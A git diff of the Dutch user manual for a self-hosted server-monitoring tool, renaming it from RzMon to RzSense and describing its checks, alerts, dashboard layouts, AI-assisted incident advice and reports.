@@ -1,14 +1,16 @@
-# 📡 RzMon – Handleiding
+# 📡 RzSense – Handleiding
 
-RzMon is een zelf-gehoste monitoringtool voor je servers, netwerkapparaten en Home Assistant. Hij controleert elke minuut of alles draait en stuurt een **Pushover**-bericht naar je telefoon zodra een drempel wordt overschreden.
+RzSense is een zelf-gehoste monitoringtool voor je servers, netwerkapparaten en Home Assistant. Hij controleert elke minuut of alles draait en stuurt een **Pushover**-bericht naar je telefoon zodra een drempel wordt overschreden.
 
 Je kunt hem draaien op elke Linux-machine met PHP 8 en MariaDB: een VM, een Raspberry Pi of een NAS met Docker/LXC.
+
+> **Nieuwe naam (1.214.0):** RzMon heet nu **Rz//Sense AI** (kort: RzSense), met de slogan *Watching your servers, so you don't have to.* Alleen de naam, het logo en de iconen zijn veranderd. De technische naam blijft `rzmon`: de map, de database, de service `rzmon-agent`, `/etc/default/rzmon-agent`, de add-on en de links werken gewoon door. Je hoeft niets aan te passen. Monitoring heet in het webadres nu `#monitoring`; oude links met `#dashboard` werken nog.
 
 ---
 
 ## Inhoud
 
-1. [Wat is RzMon?](#1-wat-is-rzmon)
+1. [Wat is RzSense?](#1-wat-is-rzsense)
 2. [Alle features](#2-alle-features)
 3. [Hoe werkt het?](#3-hoe-werkt-het)
 4. [Benodigdheden](#4-benodigdheden)
@@ -27,9 +29,9 @@ Je kunt hem draaien op elke Linux-machine met PHP 8 en MariaDB: een VM, een Rasp
 
 ---
 
-## 1. Wat is RzMon?
+## 1. Wat is RzSense?
 
-RzMon bestaat uit vier onderdelen:
+RzSense bestaat uit vier onderdelen:
 
 | Onderdeel | Wat het doet | Waar |
 |---|---|---|
@@ -60,16 +62,16 @@ RzMon bestaat uit vier onderdelen:
 | **Logbestand (zoeken)** | Treffers van een zoekpatroon in een logbestand, het systemlog of kernelmeldingen (bv. mislukte logins, hardwarefouten) | Aantal treffers in de laatste 15 min (instelbaar) | Agent |
 | **Container (Podman/Docker)** | Eén check per container: altijd de status (incl. healthcheck en herstarts), plus naar keuze CPU, RAM en disk | Gestopt/ongezond = CRITICAL; CPU/RAM in %, disk in MB, elk met eigen drempels | Agent met podman |
 | **Heartbeat** | Meldt een script, back-up of cronjob zich op tijd? Via `rzmon-hb` (agent) of een geheime URL; met start, ok, fail, duur en een waarde (§7.8) | Te laat = WARNING, 2× de speling = CRITICAL; fail = CRITICAL; te lang bezig = CRITICAL; waarde met eigen drempels | Alle servers (vanaf 1.77.0) |
-| **DNS** (vanaf 1.138.0) | Geeft een naam antwoord (A, AAAA, MX, TXT, CNAME, NS), eventueel via een eigen DNS-server, met de waarde die je verwacht? | Responstijd in ms. Geen antwoord of andere waarde = CRITICAL | Alle servers (RzMon vraagt zelf) |
-| **Tijd (NTP)** (vanaf 1.138.0) | Loopt de klok goed? Op agent-servers de klok van de server (chrony of systemd-timesyncd); of een NTP-server (bv. je router) die RzMon zelf vraagt | Afwijking in ms. Niet gesynchroniseerd = WARNING | Agent 1.70.0, of een NTP-server |
+| **DNS** (vanaf 1.138.0) | Geeft een naam antwoord (A, AAAA, MX, TXT, CNAME, NS), eventueel via een eigen DNS-server, met de waarde die je verwacht? | Responstijd in ms. Geen antwoord of andere waarde = CRITICAL | Alle servers (RzSense vraagt zelf) |
+| **Tijd (NTP)** (vanaf 1.138.0) | Loopt de klok goed? Op agent-servers de klok van de server (chrony of systemd-timesyncd); of een NTP-server (bv. je router) die RzSense zelf vraagt | Afwijking in ms. Niet gesynchroniseerd = WARNING | Agent 1.70.0, of een NTP-server |
 | **Schijfgezondheid (SMART)** (vanaf 1.138.0) | Gezondheidstest, temperatuur, slijtage (SSD/NVMe), vervangen en twijfelachtige sectoren, per schijf of alle; schijven in slaapstand worden niet gewekt | Temperatuur in °C. Test mislukt of ≥ 90% versleten = CRITICAL; sectoren of ≥ 80% versleten = WARNING | Agent 1.70.0 met smartmontools |
 | **UPS (NUT)** (vanaf 1.138.0) | Op het net of op de batterij, lading, resterende tijd, belasting | Lading in % (lager is slechter). Op de batterij = WARNING, bijna leeg = CRITICAL | Agent 1.70.0 met NUT (`upsc`) |
-| **Database** (MariaDB, MySQL, PostgreSQL; vanaf 1.138.0, uitgebreid in 1.200.0) | Van binnen: verbindingen, lopende en trage query's, cache, replicatie, grootte, deadlocks en (PostgreSQL) wraparound en idle in transaction. Overzicht in één check, of één waarde (§8.5c) | Overzicht: hoe lang de meting duurde (ms); niet verbonden = CRITICAL. Losse waarden met hun eigen eenheid | Via de agent (lokaal of in een container) of RzMon maakt verbinding |
-| **Domein (verloopdatum)** (vanaf 1.170.0) | Wanneer je domein verloopt, via RDAP (de opvolger van WHOIS), hooguit twee keer per dag opgevraagd; registrar en status erbij. Registries die geen verloopdatum publiceren (zoals .nl): of het domein nog geregistreerd en actief is | Dagen tot het verloopt (standaard warning 30, critical 14). Niet gevonden, of een status als *pending delete*, *redemption* of *quarantaine* = CRITICAL | Alle servers (RzMon vraagt het op) |
-| **MQTT-broker** (vanaf 1.170.0) | Inloggen (eventueel met gebruiker, wachtwoord en TLS), een testbericht op `rzmon/check/…` sturen en zelf terug ontvangen, en eventueel een topic bekijken (bv. `zigbee2mqtt/bridge/state` moet `online` bevatten) | Rondgang in ms. Niet verbonden, inloggen geweigerd, testbericht komt niet terug of het topic klopt niet = CRITICAL; geen bericht op het topic (niet *retained*?) = WARNING | Alle servers (RzMon maakt verbinding) |
-| **VPN: Gluetun** (vanaf 1.170.0) | De control server van Gluetun (standaard `http://<server>:8000`, eventueel met API-sleutel): draait de VPN, welk publiek IP, land en provider | Gestopt = CRITICAL; **lek** (het publieke IP is je eigen IP, dat van de internetlijn van RzMon) = CRITICAL; ander land dan verwacht = WARNING | Alle servers (RzMon vraagt het op) |
+| **Database** (MariaDB, MySQL, PostgreSQL; vanaf 1.138.0, uitgebreid in 1.200.0) | Van binnen: verbindingen, lopende en trage query's, cache, replicatie, grootte, deadlocks en (PostgreSQL) wraparound en idle in transaction. Overzicht in één check, of één waarde (§8.5c) | Overzicht: hoe lang de meting duurde (ms); niet verbonden = CRITICAL. Losse waarden met hun eigen eenheid | Via de agent (lokaal of in een container) of RzSense maakt verbinding |
+| **Domein (verloopdatum)** (vanaf 1.170.0) | Wanneer je domein verloopt, via RDAP (de opvolger van WHOIS), hooguit twee keer per dag opgevraagd; registrar en status erbij. Registries die geen verloopdatum publiceren (zoals .nl): of het domein nog geregistreerd en actief is | Dagen tot het verloopt (standaard warning 30, critical 14). Niet gevonden, of een status als *pending delete*, *redemption* of *quarantaine* = CRITICAL | Alle servers (RzSense vraagt het op) |
+| **MQTT-broker** (vanaf 1.170.0) | Inloggen (eventueel met gebruiker, wachtwoord en TLS), een testbericht op `rzmon/check/…` sturen en zelf terug ontvangen, en eventueel een topic bekijken (bv. `zigbee2mqtt/bridge/state` moet `online` bevatten) | Rondgang in ms. Niet verbonden, inloggen geweigerd, testbericht komt niet terug of het topic klopt niet = CRITICAL; geen bericht op het topic (niet *retained*?) = WARNING | Alle servers (RzSense maakt verbinding) |
+| **VPN: Gluetun** (vanaf 1.170.0) | De control server van Gluetun (standaard `http://<server>:8000`, eventueel met API-sleutel): draait de VPN, welk publiek IP, land en provider | Gestopt = CRITICAL; **lek** (het publieke IP is je eigen IP, dat van de internetlijn van RzSense) = CRITICAL; ander land dan verwacht = WARNING | Alle servers (RzSense vraagt het op) |
 | **VPN: WireGuard** (vanaf 1.170.0, agent 1.75.0 als root) | Per peer de laatste handshake, het verkeer en het endpoint (`wg show`); kies een peer, een interface (bv. `wg0`) of alle peers: de oudste telt | Seconden sinds de laatste handshake (standaard warning 300, critical 900); nog nooit een handshake = CRITICAL. Tip: zet `PersistentKeepalive = 25`, anders maakt een stille tunnel geen handshakes | Servers met de agent |
-| **Internet** (vanaf 1.157.0) | Je internetlijn, gemeten vanaf de server van RzMon: **ping** (1.1.1.1, 8.8.8.8 en je router), **responstijd** (google.com en cloudflare.com), **download** en **upload** (snelheidstest) | Ping en responstijd in ms; snelheid in Mbit/s, vergeleken met je abonnement. Zie § 7.16 | Alle servers (RzMon meet zelf) |
+| **Internet** (vanaf 1.157.0) | Je internetlijn, gemeten vanaf de server van RzSense: **ping** (1.1.1.1, 8.8.8.8 en je router), **responstijd** (google.com en cloudflare.com), **download** en **upload** (snelheidstest) | Ping en responstijd in ms; snelheid in Mbit/s, vergeleken met je abonnement. Zie § 7.16 | Alle servers (RzSense meet zelf) |
 
 **Veilige adressen (vanaf 1.138.0):** een HTTP-check vraagt alleen `http://` en `https://` op, en nooit link-local adressen zoals `169.254.169.254` (de metadata-dienst van clouds), ook niet na een doorverwijzing. Je LAN, `localhost` en internet blijven gewoon werken.
 
@@ -78,7 +80,7 @@ RzMon bestaat uit vier onderdelen:
 **⇄ Omgekeerde status:** bij ping, poort, HTTP, DNS, MariaDB, service, container, Podman, commando en Home Assistant kies je zelf welke status een check krijgt als hij slaagt (OK, warning of critical) en als hij mislukt. Zo bewaak je iets dat juist níet mag draaien of bereikbaar mag zijn (§7.2).
 
 ### Drie soorten servers
-- **Lokaal**: de RzMon-server zelf. Alles wordt direct uitgelezen.
+- **Lokaal**: de RzSense-server zelf. Alles wordt direct uitgelezen.
 - **Remote met agent**: een Linux-server of Home Assistant die zelf gegevens doorstuurt. Stopt de agent met rapporteren, dan worden de checks na 5 minuten CRITICAL (instelbaar).
 - **Remote (alleen netwerk)**: routers, NAS, switches, printers en websites. Daarvoor zijn ping, TCP en HTTP beschikbaar.
 
@@ -92,7 +94,7 @@ RzMon bestaat uit vier onderdelen:
 - **Prioriteit en geluid instelbaar**, apart voor critical en warning, inclusief *Emergency* (blijft herhalen tot je hem bevestigt).
 - **Testknoppen** voor elk kanaal, en een **meldingenlog** dat per melding toont via welk kanaal hij is verstuurd: 📲 Pushover, 📧 e-mail, 🏠 Home Assistant (met ✕ = mislukt), of 🔕 = niet verstuurd, alleen op de pagina (kanaal of meldregel staat uit).
 - **Pagina Meldingen** (vanaf 1.67.0 in dezelfde opbouw als het dashboard):
-  - **Tellers van vandaag** onder de header (⬣ Critical · ▲ Warning · ? Onbekend · ✓ Hersteld · ⓘ Info · ⓘ Systeeminfo · ⛨ Beveiliging), klikbaar als filter; ze blijven staan als je scrolt. **Info** is info van een check (bijvoorbeeld een herstart of een info-check), **Systeeminfo** is wat RzMon zelf meldt (RzMon of een agent bijgewerkt, ingelogd); vanaf 1.207.0 apart geteld.
+  - **Tellers van vandaag** onder de header (⬣ Critical · ▲ Warning · ? Onbekend · ✓ Hersteld · ⓘ Info · ⓘ Systeeminfo · ⛨ Beveiliging), klikbaar als filter; ze blijven staan als je scrolt. **Info** is info van een check (bijvoorbeeld een herstart of een info-check), **Systeeminfo** is wat RzSense zelf meldt (RzSense of een agent bijgewerkt, ingelogd); vanaf 1.207.0 apart geteld.
   - **Kerncijfers**: meldingen vandaag (met een lijntje per uur en de vergelijking met gisteren), storingen die nu open staan, **niet verzonden** in de laatste 24 uur (met de meest voorkomende reden en een link naar de kanalen), de drukste server en de laatste melding.
   - **Werkbalk**: zoeken in titel, bericht en server, chips *Alles · Zonder systeeminfo · Nog open · Storingen · Hersteld · Info · Systeeminfo · Beveiliging* (met aantallen), een keuze voor de server, sorteren en ⋯ (*Alles openen*).
   - **Eén regel per storing** (vanaf 1.207.0): een warning of critical van een check en de meldingen erna tot het herstel staan op **één regel**, met de ergste status, *van → ✓ hersteld om*, een balkje en de duur (bijvoorbeeld *04:48 → ✓ 05:28 · 40 min*). Kwamen er meer meldingen in die storing, dan staat het aantal erbij (**2×**). De kolommen zijn *Wanneer* (vandaag hoe lang geleden, anders de tijd), *Status*, *Bron* (server › check), *Wat* (het bericht, met de drempel als los label), *Verloop* en de kanalen (✓ verzonden, rood ✕ niet verzonden; wijs het aan voor de reden).
@@ -107,7 +109,7 @@ RzMon bestaat uit vier onderdelen:
 ### Storingen bevestigen
 - **✔ Bevestigen** per check, of alle storingen van een server tegelijk, met een optionele opmerking. Daarna krijg je voor die storing **geen meldingen meer**: geen herhalingen, ook niet bij erger worden.
 - **Vanaf je telefoon:** elke melding bevat een link **"✔ Bevestigen"** (Pushover, en via de webhook ook in Home Assistant). Die werkt zonder inloggen, maar alleen voor die ene storing.
-- **Emergency-meldingen:** bevestig je in de Pushover-app, dan neemt RzMon dat over. Bevestig je in RzMon, dan stopt Pushover met herhalen.
+- **Emergency-meldingen:** bevestig je in de Pushover-app, dan neemt RzSense dat over. Bevestig je in RzSense, dan stopt Pushover met herhalen.
 - **Vervalt vanzelf:** zodra de check weer OK is, vervalt de bevestiging. Een nieuwe storing geeft gewoon weer een melding.
 
 ### Onderhoud en afhankelijkheden
@@ -115,7 +117,7 @@ RzMon bestaat uit vier onderdelen:
 - **🔗 Afhankelijkheden:** geef aan dat een server bereikbaar is via een andere, zoals een router, switch, VPN of hypervisor. Valt die uit, dan krijg je **één** melding ("…meldingen van 5 afhankelijke servers worden onderdrukt") in plaats van een stortvloed. Komt hij terug en ligt een server erachter nog plat, dan krijg je die melding alsnog.
 
 ### Dashboard: zo staat het ervoor 🧭 (vanaf 1.134.0)
-Het eerste tabblad, en de pagina waarop RzMon opent: monitoring, beveiliging, kwetsbaarheden en netwerk op één plek. Het vroegere dashboard heet nu **Monitoring** (op de telefoon *Checks*); het oude adres `#dashboard` blijft werken.
+Het eerste tabblad, en de pagina waarop RzSense opent: monitoring, beveiliging, kwetsbaarheden en netwerk op één plek. Het vroegere dashboard heet nu **Monitoring** (op de telefoon *Checks*); het oude adres `#dashboard` blijft werken.
 
 **Indeling vanaf 1.144.0** (van boven naar beneden):
 1. **Statuszin** met de totaalscore: bijvoorbeeld *"3 dingen om nu te doen (1 dringend) · 2 open incidenten · 1 server vraagt aandacht."*, of *"Alles in orde: 12 servers en 140 checks zonder problemen."*
@@ -188,7 +190,7 @@ Dit wordt per pagina onthouden, voor jouw account. Op een smal scherm (telefoon)
 
 In de **Instellingen** heeft elk onderdeel (bv. *Meldingen → Kanalen* of *IDS → Algemeen*) een eigen indeling; de zijbalk blijft vast staan. Zo zet je bijvoorbeeld Pushover en ntfy naast elkaar en e-mail erboven. Opslaan van de instellingen werkt zoals altijd. In de **Agent Manager** kun je *Functies* en *Verbinding* naast of onder elkaar zetten; die indeling geldt voor alle servers.
 
-**Servers op Monitoring in CC** (vanaf 1.164.0): elke server is een compact blok met naam, adres, soort, tellers, een samenvatting en de laatste 24 uur. **Klik op een blok** en het groeit vloeiend naar de volle breedte: de server wordt één tabelrij (adres, soort, status, checks, beschikbaar 24 uur, laatste 24 uur, laatste check), met daaronder de knoppen van de server (bevestigen, onderhoud, ＋ Check, poorten, bewerken, Agent Manager) en de **lijst met checks**, iets ingesprongen en rechts gelijk met de server. Per check zie je status, waarde, verloop, melding en 24 uur, met ✔ Bevestig en ✎. **Klik op een check** voor het checkvenster. Je opent en sluit elke server zelf (✕); er mogen er meer tegelijk open zijn. *Alles openen* opent ze allemaal. RzMon onthoudt dit niet: ga je naar een andere pagina of herlaad je, dan is alles weer dicht. In Blox, L1nes en Compact verandert er niets.
+**Servers op Monitoring in CC** (vanaf 1.164.0): elke server is een compact blok met naam, adres, soort, tellers, een samenvatting en de laatste 24 uur. **Klik op een blok** en het groeit vloeiend naar de volle breedte: de server wordt één tabelrij (adres, soort, status, checks, beschikbaar 24 uur, laatste 24 uur, laatste check), met daaronder de knoppen van de server (bevestigen, onderhoud, ＋ Check, poorten, bewerken, Agent Manager) en de **lijst met checks**, iets ingesprongen en rechts gelijk met de server. Per check zie je status, waarde, verloop, melding en 24 uur, met ✔ Bevestig en ✎. **Klik op een check** voor het checkvenster. Je opent en sluit elke server zelf (✕); er mogen er meer tegelijk open zijn. *Alles openen* opent ze allemaal. RzSense onthoudt dit niet: ga je naar een andere pagina of herlaad je, dan is alles weer dicht. In Blox, L1nes en Compact verandert er niets.
 
 **Vanaf 1.175.0** ziet Monitoring in CC er anders uit. Er is geen aparte sectie *met problemen* meer: per groep staan alle servers in één raster, wie aandacht vraagt eerst. Elke tegel toont een **ring** (checks in orde van het totaal), de samenvatting en de soort als chips, **twee lijntjes** van de belangrijkste checks en de laatste 24 uur. **Klik op een tegel** en hij klapt met een veeranimatie (zoals op een Mac) open over de volle breedte; de andere tegels schuiven opzij. Bovenaan staan meters (CPU, RAM, schijf, beschikbaar 24 uur), dan de knoppen, dan **Vraagt aandacht** (één rij per check, met ✔ Bevestig) en **In orde** als kleine tegels: de eerste 8, de rest met *＋ … andere checks tonen*. Met ✕ krimpt hij terug. Er komt nooit een schuifbalk naar links of rechts, ook niet op een telefoon. Wil je geen animaties, zet dan **Beweging** op *Stil* (of *Rustig*: wel openklappen, geen scan en pulsjes). Je thema (licht of donker) verandert niet.
 
@@ -198,7 +200,7 @@ In de **Instellingen** heeft elk onderdeel (bv. *Meldingen → Kanalen* of *IDS 
 - **IDS**: *Aanvallen per dag* staat altijd open (in de andere lay-outs blijft het een regel die je uitklapt). De tabbladen (Incidenten, Aanvalskaart …) zijn samen één kaart.
 - **Incidenten**: *Geopend en opgelost* (per dag, 30 dagen) en *Nog bezig, per bron* (monitoring, IDS, kwetsbaarheden).
 - **Kwetsbaarheden**: *Per ernst* (met hoeveel er actief misbruikt worden) en *Servers met de meeste kwetsbaarheden*.
-- **Netwerk**: *Apparaten*: online, nieuw, riskante poort, in RzMon, bekend en genegeerd.
+- **Netwerk**: *Apparaten*: online, nieuw, riskante poort, in RzSense, bekend en genegeerd.
 
 **Meldingen in CC** heeft twee extra kaarten: **Meldingen per uur** (de laatste 24 uur, per status: critical, warning, hersteld en info) en **Per kanaal** (push, e-mail, webhook / Home Assistant en alleen op de pagina, over de geladen dagen).
 
@@ -218,7 +220,7 @@ De pagina Monitoring (vanaf 1.66.0, tot 1.134.0 *Dashboard*), van boven naar ben
   - **Open problemen** (nog niet bevestigd), met het **langst openstaande** en hoe lang al;
   - **Beschikbaar 24 u**: de gemiddelde beschikbaarheid, met een lijntje van het deel van de checks dat OK was per half uur.
 
-  Een tegel krijgt alleen een rode rand als er iets mis is. Klik op een servernaam en RzMon springt naar die server en klapt hem open.
+  Een tegel krijgt alleen een rode rand als er iets mis is. Klik op een servernaam en RzSense springt naar die server en klapt hem open.
 - **⚠️ Nu aandacht nodig**: alle open problemen in één lijst, critical eerst, daarna warning en onbekend, de oudste bovenaan. Per regel: de server, de check, het bericht, hoe lang al, en **✔ Bevestig** en **🔧** (onderhoud). Je ziet er 6 (op de telefoon 3); **Alle … tonen** klapt de rest uit. Bevestigde problemen staan er niet in, wel hoeveel het er zijn. Geen open problemen: dan verdwijnt de lijst (de tegel ernaast zegt al *Alles in orde*); zijn er wel bevestigde problemen, dan staat er een klein regeltje *✔ Geen open problemen · 2 bevestigd* met **bekijken** (zet de chip *Problemen* aan).
 - **Werkbalk**: zoeken (zoek je op een checknaam, dan klapt de server vanzelf open), **filterchips** met aantallen (*Alle · Problemen · Onderhoud · 🖥️ Servers · 🌐 Netwerk · 🗄️ Opslag · 🔋 Stroom · 📷 Camera's · 🏠 Smart home · 📦 Overig*; alleen soorten die je hebt, met een rood bolletje als er een open probleem is), **sorteren** (*Ergste eerst* of *Op naam*), het menu **⋯** met *🔧 Onderhoud* (alle meldingen pauzeren), *↻ Alles nu checken* en *⊞ Alles openen*, en **＋ Server**. De filterchip geldt alleen zolang je op de pagina blijft: open je Monitoring opnieuw (of kom je terug van een andere pagina), dan staat hij weer op **Alle**, zodat je nooit storingen mist (vanaf 1.171.4). De sortering wordt per gebruiker onthouden.
 - **Drie groepen** (vanaf 1.168.0): *Met open problemen* (precies wat ook in **Nu aandacht nodig** staat), **✔ Bevestigd** (servers waarvan alle problemen al bevestigd zijn: je weet ervan, er is nu niets te doen) en *Alles in orde*. Een server in *Bevestigd* heeft een gestippelde rand, geen rode gloed en de regel **✔ alles bevestigd · …**; zo zie je in één oogopslag het verschil met een server waar nog iets open staat. In de kop van elke soort apparaat staat hoeveel er problemen hebben en hoeveel bevestigd zijn.
@@ -226,7 +228,7 @@ De pagina Monitoring (vanaf 1.66.0, tot 1.134.0 *Dashboard*), van boven naar ben
 - **✔ Alles in orde**: servers waar alles OK is, compact onder elkaar: één regel met naam, aantal checks, de mini-grafiekjes en de beschikbaarheid over 24 uur. Klik erop voor alle checks.
 
 **Live tegels (vanaf 1.157.0).** De pagina laat nu meteen zien hoe het gaat, zonder dat je hoeft te klikken:
-- **De 3 belangrijkste checks** staan op elke kaart (Blox Large) en in elke rij (L1nes), met de **waarde**, een **lijntje van 24 uur** in de kleur van de status en, bij procenten, een balkje. RzMon kiest ze zelf: **eerst wat stuk is**, dan checks met een meetwaarde in deze volgorde: internet (download, upload, ping), CPU, RAM, de volste disk, responstijd, ping, HTTP, poort, DNS, MariaDB … Zo krijgt ook een router, NAS of Home Assistant zonder CPU-check zijn eigen belangrijkste checks. Klik op een check voor de popup.
+- **De 3 belangrijkste checks** staan op elke kaart (Blox Large) en in elke rij (L1nes), met de **waarde**, een **lijntje van 24 uur** in de kleur van de status en, bij procenten, een balkje. RzSense kiest ze zelf: **eerst wat stuk is**, dan checks met een meetwaarde in deze volgorde: internet (download, upload, ping), CPU, RAM, de volste disk, responstijd, ping, HTTP, poort, DNS, MariaDB … Zo krijgt ook een router, NAS of Home Assistant zonder CPU-check zijn eigen belangrijkste checks. Klik op een check voor de popup.
 - **24 uur als balkje**: per server (onderaan de kaart, of in de kolom *Status 24 u*) een blokje per uur: groen, oranje of rood. Zo zie je meteen of iets net stuk is of al de hele dag.
 - **Blox Large** toont nu ook de servers waar alles OK is als kaart; **Blox Small** houdt de compacte lijst.
 - **L1nes Large** heeft de kolommen *Belangrijkste checks* (drie) en *Status 24 u* in plaats van CPU, RAM en disk; **L1nes Small** zet de drie checks als tekst in de rij, met wat stuk is in rood of oranje.
@@ -238,17 +240,17 @@ De pagina Monitoring (vanaf 1.66.0, tot 1.134.0 *Dashboard*), van boven naar ben
 - **Rode gloed**: een server met een onbevestigde critical pulseert zacht.
 - Beide zet je uit bij **Mijn account → Weergave** (*Rode gloed bij critical* en *Live animaties*, per account). Staat je systeem op *minder beweging*, dan beweegt er niets.
 
-**Liquid Glass** (vanaf 1.201.0, **Mijn account → Weergave**, per account, standaard uit): kaarten, menu's, de tabbalk en vensters worden doorschijnend glas met blur, een lichte rand aan de bovenkant en een glans die je muis volgt. Achter het glas beweegt heel traag een zacht licht in de kleuren van RzMon. De indeling, de statuskleuren en licht/donker/automatisch blijven precies hetzelfde. Kan je browser geen blur, dan zie je het gewone uiterlijk; met *minder beweging* staat het licht stil.
+**Liquid Glass** (vanaf 1.201.0, **Mijn account → Weergave**, per account, standaard uit): kaarten, menu's, de tabbalk en vensters worden doorschijnend glas met blur, een lichte rand aan de bovenkant en een glans die je muis volgt. Achter het glas beweegt heel traag een zacht licht in de kleuren van RzSense. De indeling, de statuskleuren en licht/donker/automatisch blijven precies hetzelfde. Kan je browser geen blur, dan zie je het gewone uiterlijk; met *minder beweging* staat het licht stil.
 
 **Laadanimatie** (vanaf 1.201.0, **Mijn account → Weergave**, per account, standaard aan):
-- **Bij het openen** van RzMon: RzMon in het midden en je servers eromheen; een radar veegt rond. Zodra de status binnen is, lichten je eigen servers (de ergste eerst, hooguit 12) een voor een op in hun statuskleur en sturen ze een pakketje naar het midden. Onderaan loopt een hartslag. Na ongeveer een seconde verdwijnt het scherm vanzelf; het houdt het laden niet op.
+- **Bij het openen** van RzSense: RzSense in het midden en je servers eromheen; een radar veegt rond. Zodra de status binnen is, lichten je eigen servers (de ergste eerst, hooguit 12) een voor een op in hun statuskleur en sturen ze een pakketje naar het midden. Onderaan loopt een hartslag. Na ongeveer een seconde verdwijnt het scherm vanzelf; het houdt het laden niet op.
 - **Overal waar je moet wachten**: bij *Laden…* een korte hartslag ervoor, bij *Bezig…* een kleine radarboog.
 - Met *minder beweging* staat er een stilstaand beeld en is er geen openingsscherm.
 
 **Laadteller per pagina** (vanaf 1.202.0): open je een pagina of een tabblad (bijvoorbeeld IDS) en duurt het laden even, dan zie je dat meteen:
 - na **0,4 s** een dun balkje bovenaan, een teller in het kruimelpad (*IDS laden · 0,8 s*) en een draaiertje bij het menu-item; wat er al stond blijft gedimd staan;
 - na **1,5 s** de pols-animatie over de pagina (niet over het hele scherm), met per onderdeel ✓ of … (bijvoorbeeld *Incidenten ✓ · Toegang …*). Staat de *Laadanimatie* uit, dan blijft het bij het balkje en de teller;
-- na **8 s** *Dit duurt langer dan normaal (meestal X s)* met **↻ Opnieuw**. RzMon onthoudt in je browser hoe lang elke pagina meestal duurt.
+- na **8 s** *Dit duurt langer dan normaal (meestal X s)* met **↻ Opnieuw**. RzSense onthoudt in je browser hoe lang elke pagina meestal duurt.
 - Gaat het sneller dan 0,4 s, dan zie je niets. Verversen op de achtergrond (live) toont de teller nooit.
 
 **Zijbalk** (vanaf 1.202.0): op een breed scherm is de zijbalk een zwevend paneel met dezelfde achtergrond als de pagina, afgeronde hoeken en kopjes *Overzicht*, *Beveiliging* en *Analyse en netwerk*. Het actieve item heeft een blauwe streep links. Met Liquid Glass aan wordt het paneel glas. Inklappen, breder of smaller slepen en het beheermenu werken zoals eerder.
@@ -301,7 +303,7 @@ Een AI legt een storing of incident uit en stelt een oplossing voor. Je zet het 
   - Het antwoord heeft vier kopjes: *wat is er aan de hand*, *de oorzaak*, *de oplossing in stappen* (commando's om te kopiëren) en *controleren*.
   - Met **🔄 Opnieuw vragen** vraag je een nieuw advies.
   - Beheerders en gebruikers mogen een advies vragen; alleen-lezen-accounts lezen een advies dat er al is.
-- **Wat er meegaat:** de check en de server, de statuswissels en metingen, andere problemen op de server, wijzigingen in RzMon (7 dagen) en pogingen van zelf herstellen. Wachtwoorden en tokens gaan er altijd uit.
+- **Wat er meegaat:** de check en de server, de statuswissels en metingen, andere problemen op de server, wijzigingen in RzSense (7 dagen) en pogingen van zelf herstellen. Wachtwoorden en tokens gaan er altijd uit.
 - **Op verzoek of automatisch:** automatisch is één advies per storing zodra die CRITICAL wordt. Heeft een server 3 of meer problemen, dan één advies voor die server.
 - **Cloud:**
   - Met een **daglimiet** (standaard 50 vragen) houd je de kosten in de hand.
@@ -315,20 +317,20 @@ Een AI legt een storing of incident uit en stelt een oplossing voor. Je zet het 
     - poort: wie er luistert;
     - altijd: de laatste fouten in het journal en dmesg.
   - Dat duurt meestal 1–2 minuten.
-  - Zonder agent kijkt RzMon zelf: DNS, poorten en HTTP.
+  - Zonder agent kijkt RzSense zelf: DNS, poorten en HTTP.
   - De AI kiest nooit commando's. `COMMANDS=0` op een server blokkeert het daar altijd.
 - **📝 Alleen tekst ↔ ▶ Uitvoeren** (standaard *alleen tekst*; aanzetten vraagt je wachtwoord):
   - Een advies mag een **bestaande** herstelactie voorstellen: herstarten, of een herstelscript uit `/etc/rzmon-agent/heal.d`.
   - Een beheerder voert die uit met ▶ en een bevestiging. Het gaat via zelf herstellen bij de volgende ronde van de agent, en komt in het logboek.
   - Een service wordt alleen herstart als hij echt stil ligt.
-- **Ollama op een andere machine:** laat het daar luisteren op het netwerk (`OLLAMA_HOST=0.0.0.0`) en zet poort 11434 in de firewall **alleen open voor de server van RzMon**. Ollama heeft zelf geen wachtwoord.
+- **Ollama op een andere machine:** laat het daar luisteren op het netwerk (`OLLAMA_HOST=0.0.0.0`) en zet poort 11434 in de firewall **alleen open voor de server van RzSense**. Ollama heeft zelf geen wachtwoord.
 
 #### 💶 Verbruik en tegoed (vanaf 1.173.0)
-De aanbieders laten met een gewone API-sleutel **niet** zien hoeveel tegoed je nog hebt. RzMon telt daarom zelf mee; de bedragen zijn een **schatting**.
+De aanbieders laten met een gewone API-sleutel **niet** zien hoeveel tegoed je nog hebt. RzSense telt daarom zelf mee; de bedragen zijn een **schatting**.
 - **Tokens:** elk antwoord zegt hoeveel tokens erin en eruit gingen. Dat staat onder elk advies, met de geschatte kosten (*± € 0,0042*). Bij Ollama staat er *gratis* en hoeveel tokens per seconde het model maakte.
-- **Prijs per model:** vul in de tabel de prijs in euro per **1 miljoen tokens** in (in en uit apart). Die staat op de website van de aanbieder, vaak in dollars: reken om naar euro. Vul je de prijs later in, dan rekent RzMon de adviezen van deze maand alsnog uit.
+- **Prijs per model:** vul in de tabel de prijs in euro per **1 miljoen tokens** in (in en uit apart). Die staat op de website van de aanbieder, vaak in dollars: reken om naar euro. Vul je de prijs later in, dan rekent RzSense de adviezen van deze maand alsnog uit.
 - **Bovenaan:** vandaag, deze maand (met je budget als balk) en per aanbieder je tegoed. Daaronder de kosten per dag over 30 dagen (zonder kosten, bv. alleen Ollama: tokens per dag).
-- **Tegoed bijhouden:** vul per aanbieder in hoeveel je hebt opgewaardeerd en vanaf welke dag. RzMon trekt de kosten sindsdien eraf: *± € 7,40 over van € 10*. Is er nog 20% over, dan krijg je een melding. Waardeer je op, pas dan het bedrag en de datum aan.
+- **Tegoed bijhouden:** vul per aanbieder in hoeveel je hebt opgewaardeerd en vanaf welke dag. RzSense trekt de kosten sindsdien eraf: *± € 7,40 over van € 10*. Is er nog 20% over, dan krijg je een melding. Waardeer je op, pas dan het bedrag en de datum aan.
 - **Maandbudget (€):** is het op, dan stopt AI-advies via de cloud tot de volgende maand, of gaat het naar Ollama (zie *Terugvallen op Ollama*). Bij 80% krijg je een melding. 0 = geen budget. De daglimiet (vragen per dag) blijft daarnaast gelden.
 - **Tegoed op:** meldt een aanbieder dat het tegoed op is, dan:
   - staat dat rood bovenaan dit onderdeel, met een knop **Opwaarderen ↗** naar de website van de aanbieder;
@@ -381,7 +383,7 @@ Op **📊 Analyse** staat de knop **📄 Rapport (PDF)**. Die opent een nette, a
 - **beveiliging** (IDS en blokkades) en de **kwetsbaarheden** per server van nu;
 - **wat nu aanpakken**.
 
